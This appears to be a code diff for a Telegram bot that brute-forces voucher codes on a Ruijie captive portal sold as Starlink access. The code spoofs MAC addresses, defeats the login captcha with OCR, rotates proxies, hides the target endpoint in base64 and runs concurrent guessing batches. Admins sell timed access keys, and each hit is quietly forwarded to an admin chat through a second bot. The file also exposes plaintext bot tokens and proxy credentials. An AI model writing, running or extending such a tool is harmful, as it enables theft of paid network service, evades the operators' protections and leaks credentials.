@@ -1,16 +1,14 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, threading, hashlib
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
 import cv2, ddddocr, numpy as np
 
 BOT_TOKEN = "8867816797:AAFXkNP8MJEIjAHZRsRAUDhAn_EgmeLYowg"
-GITHUB_TOKEN = '8971195833:AAGJVTAkqMI7UebWGC7dh2oY3CGvxPm-Zx4'
-REPO_OWNER = "makkqt"
-REPO_NAME = "yes"
+FORWARD_BOT_TOKEN = "8666040280:AAF3qRvNtY_dPMRbzzrFo2uGWuYYDtNODwE"
 ADMINS = ["7366841341", "8728200516"]
 
-PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 15
+PROXY_LIST = ["kdobnvaq:4y2b5qje1mhd@31.59.20.176:6754"] * 30
 _proxy_index = 0
 def get_next_proxy():
     global _proxy_index
@@ -19,21 +17,55 @@ def get_next_proxy():
     _proxy_index += 1
     return f"http://{proxy}"
 
-SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
-user_data, scan_tasks, success_texts = {}, {}, {}
-VALID_KEYS, USER_KEYS = set(), {}
+forward_bot = AsyncTeleBot(FORWARD_BOT_TOKEN)
+
+user_data, active_scans, scan_stats = {}, {}, {}
+VALID_KEYS = {} # Format: {key: expiry_timestamp}
+USER_KEYS = {}  # Format: {chat_id: {"key": key, "expiry": timestamp}}
 session, _connector = None, None
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
+async def verify_hit(session_url, code):
+    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
+    proxy = get_next_proxy()
+    timeout = aiohttp.ClientTimeout(total=15)
+    async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
+        try:
+            mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
+            s_url = re.sub(r'(?<=mac=)[^&]+', mac, session_url)
+            async with ts.get(s_url, headers={'user-agent': 'Mozilla/5.0'}, proxy=proxy) as req:
+                s_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
+                if not s_id: return False
+                sessionId = s_id.group(1)
+            
+            async with ts.get(f'https://portal-as.ruijienetworks.com/api/auth/captcha/image?sessionId={sessionId}', proxy=proxy) as img_req:
+                img_bytes = await img_req.read()
+            
+            nparr = np.frombuffer(img_bytes, np.uint8)
+            img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
+            gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
+            _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
+            authCode = _ocr.classification(cv2.imencode('.png', thresh)[1].tobytes()).upper()
+
+            data = {"accessCode": code, "sessionId": sessionId, "apiVersion": 1, "authCode": authCode}
+            headers = {"content-type": "application/json", "user-agent": "Mozilla/5.0"}
+            async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
+                resp_text = await p_req.text()
+                if 'logonUrl' in resp_text:
+                    return True
+        except Exception:
+            pass
+    return False
+
 async def perform_check(session_url, code, chat_id):
     post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
-    for _ in range(3):
+    for _ in range(2):
         proxy = get_next_proxy()
-        timeout = aiohttp.ClientTimeout(total=30)
+        timeout = aiohttp.ClientTimeout(total=20)
         async with aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=timeout) as ts:
             try:
                 mac = ':'.join(f'{random.choice([2,6,10,14]):02x}' for _ in range(6))
@@ -57,14 +89,27 @@ async def perform_check(session_url, code, chat_id):
                 async with ts.post(post_url, json=data, headers=headers, proxy=proxy) as p_req:
                     resp_text = await p_req.text()
                     if 'logonUrl' in resp_text:
-                        if chat_id not in success_texts: success_texts[chat_id] = []
-                        success_texts[chat_id].append(f"🎫 {code}")
-                        await bot.send_message(chat_id, f"✅ Success Code Hit!\n\n🎫 {code}")
-                        return
+                        # Double check verification to prevent false positive
+                        is_valid = await verify_hit(session_url, code)
+                        if not is_valid: return False
+
+                        hit_msg = (
+                            f"🚨 **STARLINK VOUCHER HIT!** 🚨\n\n"
+                            f"👤 **User ID:** `{chat_id}`\n"
+                            f"🎫 **Code:** `3000{code}`\n"
+                            f"🔗 **Portal URL:**\n{session_url}"
+                        )
+                        await bot.send_message(chat_id, f"✅ **Success Code Hit!**\n\n🎫 Code: `3000{code}`")
+                        try:
+                            await forward_bot.send_message(ADMINS[0], hit_msg, parse_mode="Markdown")
+                        except Exception:
+                            pass
+                        return True
                     if 'request limited' not in resp_text:
                         break
             except Exception:
                 pass
+    return False
 
 async def web_server():
     app = web.Application()
@@ -102,8 +147,9 @@ def voucher_kb():
 async def start(m):
     uid = str(m.chat.id)
     is_adm = is_admin(uid)
-    status = "✅ Access Granted" if uid in USER_KEYS or is_adm else "⚠️ Key လိုအပ်ပါသည်။"
-    await bot.send_message(m.chat.id, f"✨ STAR LINK BOT ✨\n\n{status}", reply_markup=main_kb(is_adm))
+    has_valid_key = uid in USER_KEYS and USER_KEYS[uid]["expiry"] > time.time()
+    status = "✅ Access Granted (Key Active)" if has_valid_key or is_adm else "⚠️ Key လိုအပ်ပါသည်။ (/key [key])"
+    await bot.send_message(m.chat.id, f"✨ STAR LINK VOUCHER SCANNER ✨\n\n{status}", reply_markup=main_kb(is_adm))
 
 @bot.callback_query_handler(func=lambda call: True)
 async def callbacks(call):
@@ -112,29 +158,47 @@ async def callbacks(call):
     is_adm = is_admin(uid)
 
     if call.data == "menu_back":
-        await bot.edit_message_text("✨ STAR LINK BOT ✨", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
+        await bot.edit_message_text("✨ STAR LINK VOUCHER SCANNER ✨", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
     elif call.data == "menu_start_scam":
         await bot.edit_message_text("🔢 ကျေးဇူးပြု၍ Voucher အမျိုးအစား ရွေးချယ်ပါ -", chat_id, call.message.message_id, reply_markup=voucher_kb())
+    elif call.data == "menu_stop":
+        if chat_id in active_scans:
+            active_scans[chat_id] = False
+            await bot.answer_callback_query(call.id, "🛑 Scan ရပ်လိုက်ပါပြီ။", show_alert=True)
+            await bot.edit_message_text("🛑 Scanning successfully stopped.", chat_id, call.message.message_id, reply_markup=main_kb(is_adm))
+        else:
+            await bot.answer_callback_query(call.id, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ၊", show_alert=True)
     elif call.data == "admin_panel" and is_adm:
         kb = InlineKeyboardMarkup(row_width=1)
-        kb.add(InlineKeyboardButton("➕ Key အသစ်ထုတ်မည်", callback_data="admin_gen_key"),
+        kb.add(InlineKeyboardButton("➕ Key အသစ်ထုတ်မည် (ရက်ပိုင်း)", callback_data="admin_gen_key_menu"),
                InlineKeyboardButton("📋 Key များကြည့်ရန်/ဖျက်ရန်", callback_data="admin_list_keys"),
                InlineKeyboardButton("🔙 Back", callback_data="menu_back"))
         await bot.edit_message_text("👑 Admin Control Panel", chat_id, call.message.message_id, reply_markup=kb)
-    elif call.data == "admin_gen_key" and is_adm:
+    elif call.data == "admin_gen_key_menu" and is_adm:
+        kb = InlineKeyboardMarkup(row_width=2)
+        kb.add(
+            InlineKeyboardButton("1 ရက်", callback_data="gen_key_1"),
+            InlineKeyboardButton("7 ရက်", callback_data="gen_key_7"),
+            InlineKeyboardButton("30 ရက်", callback_data="gen_key_30"),
+            InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
+        )
+        await bot.edit_message_text("⏰ Key သက်တမ်း ရွေးချယ်ပါ -", chat_id, call.message.message_id, reply_markup=kb)
+    elif call.data.startswith("gen_key_") and is_adm:
+        days = int(call.data.replace("gen_key_", ""))
         new_key = "STAR-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-        VALID_KEYS.add(new_key)
+        expiry_time = time.time() + (days * 86400)
+        VALID_KEYS[new_key] = expiry_time
         kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
-        await bot.edit_message_text(f"✅ New Key: `{new_key}`", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
+        await bot.edit_message_text(f"✅ Generated Key ({days} Days):\n`{new_key}`", chat_id, call.message.message_id, parse_mode="Markdown", reply_markup=kb)
     elif call.data == "admin_list_keys" and is_adm:
         kb = InlineKeyboardMarkup(row_width=1)
-        for k in list(VALID_KEYS):
+        for k in list(VALID_KEYS.keys()):
             kb.add(InlineKeyboardButton(f"❌ ဖျက်ရန်: {k}", callback_data=f"del_key_{k}"))
         kb.add(InlineKeyboardButton("🔙 Back", callback_data="admin_panel"))
         await bot.edit_message_text("📋 Active Keys:", chat_id, call.message.message_id, reply_markup=kb)
     elif call.data.startswith("del_key_") and is_adm:
         k_del = call.data.replace("del_key_", "")
-        VALID_KEYS.discard(k_del)
+        VALID_KEYS.pop(k_del, None)
         await bot.answer_callback_query(call.id, f"Deleted {k_del}", show_alert=True)
     elif call.data == "menu_enter_key":
         await bot.edit_message_text("🔑 Key ထည့်ရန်: `/key [your_key]` ကို ပို့ပါ", chat_id, call.message.message_id, parse_mode="Markdown")
@@ -142,15 +206,16 @@ async def callbacks(call):
         await bot.edit_message_text("🔗 Portal URL ထည့်ရန်: `/portal [url]` ကို ပို့ပါ။", chat_id, call.message.message_id)
     elif call.data.startswith("scan_"):
         mode = call.data.replace("scan_", "")
-        if chat_id not in user_data: user_data[chat_id] = {}
-        session_url = user_data[chat_id].get('session_url', '')
-        if not session_url:
+        if chat_id not in user_data or not user_data[chat_id].get('session_url'):
             await bot.answer_callback_query(call.id, "⚠️ ကျေးဇူးပြု၍ Portal URL အရင်ထည့်ပါ။", show_alert=True)
             return
+        
+        active_scans[chat_id] = True
+        session_url = user_data[chat_id]['session_url']
         await bot.edit_message_text(f"🚀 Scanning started with mode: {mode}...", chat_id, call.message.message_id)
-        asyncio.create_task(run_scan_loop(mode, chat_id, session_url))
+        asyncio.create_task(run_scan_loop(mode, chat_id, session_url, call.message.message_id))
 
-async def run_scan_loop(mode, chat_id, session_url):
+async def run_scan_loop(mode, chat_id, session_url, msg_id):
     strings_map = {
         "6": string.digits, "7": string.digits, "8": string.digits,
         "ascii-lower": string.ascii_lowercase,
@@ -161,19 +226,60 @@ async def run_scan_loop(mode, chat_id, session_url):
     length = 8 if mode == "mixed8" else (6 if mode in ["ascii-lower", "all", "mixed"] else int(mode))
     chars = strings_map.get(mode, string.digits)
     
-    while True:
-        code = "".join(random.choices(chars, k=length))
-        await perform_check(session_url, code, chat_id)
-        await asyncio.sleep(0.1)
+    scanned_count = 0
+    found_count = 0
+    start_time = time.time()
+    
+    while active_scans.get(chat_id, False):
+        batch_tasks = []
+        for _ in range(10): # Concurrency speed boost
+            code = "".join(random.choices(chars, k=length))
+            batch_tasks.append(perform_check(session_url, code, chat_id))
+        
+        results = await asyncio.gather(*batch_tasks)
+        scanned_count += len(batch_tasks)
+        found_count += sum(1 for r in results if r)
+        
+        elapsed = time.time() - start_time
+        speed = round(scanned_count / elapsed, 2) if elapsed > 0 else 0
+        
+        try:
+            status_text = (
+                f"🚀 **Scanning Active (Mode: {mode})**\n\n"
+                f"⚡ Speed: `{speed} req/s`\n"
+                f"🔢 Scanned: `{scanned_count}` codes\n"
+                f"🎯 Hits Found: `{found_count}`\n\n"
+                f"လိုချင်ရင် /stop ကိုနှိပ်ပြီး ရပ်နိုင်ပါတယ်။"
+            )
+            kb = InlineKeyboardMarkup().add(InlineKeyboardButton("🛑 Stop Scanning", callback_data="menu_stop"))
+            await bot.edit_message_text(status_text, chat_id, msg_id, reply_markup=kb, parse_mode="Markdown")
+        except Exception:
+            pass
+        
+        await asyncio.sleep(0.05)
 
 @bot.message_handler(commands=['key'])
 async def handle_key(m):
     args = m.text.split(maxsplit=1)
-    if len(args) > 1 and args[1].strip() in VALID_KEYS:
-        USER_KEYS[str(m.chat.id)] = args[1].strip()
-        await bot.reply_to(m, "✅ Key မှန်ကန်ပါသည်။")
+    if len(args) > 1:
+        key_input = args[1].strip()
+        uid = str(m.chat.id)
+        if key_input in VALID_KEYS and VALID_KEYS[key_input] > time.time():
+            expiry = VALID_KEYS[key_input]
+            USER_KEYS[uid] = {"key": key_input, "expiry": expiry}
+            expiry_date = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(expiry))
+            await bot.reply_to(m, f"✅ Key မှန်ကန်ပါသည်။ သက်တမ်းကုန်မည့်အချိန်: {expiry_date}")
+        else:
+            await bot.reply_to(m, "❌ Key မှားယွင်းနေပါသည် (သို့မဟုတ်) သက်တမ်းကုန်သွားပါပြီ။")
+
+@bot.message_handler(commands=['stop'])
+async def handle_stop_cmd(m):
+    chat_id = m.chat.id
+    if chat_id in active_scans:
+        active_scans[chat_id] = False
+        await bot.reply_to(m, "🛑 Scan အောင်မြင်စွာ ရပ်တန့်လိုက်ပါပြီ။")
     else:
-        await bot.reply_to(m, "❌ Key မှားယွင်းနေပါသည်။")
+        await bot.reply_to(m, "⚠️ လက်ရှိ Run နေသော Scan မရှိပါ။")
 
 @bot.message_handler(commands=['portal'])
 async def handle_portal(m):
@@ -187,7 +293,7 @@ async def handle_portal(m):
 async def main():
     global session, _connector
     session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30))
-    _connector = aiohttp.TCPConnector(limit=2000, ssl=False)
+    _connector = aiohttp.TCPConnector(limit=3000, ssl=False)
     asyncio.create_task(web_server())
     await bot.infinity_polling()
 
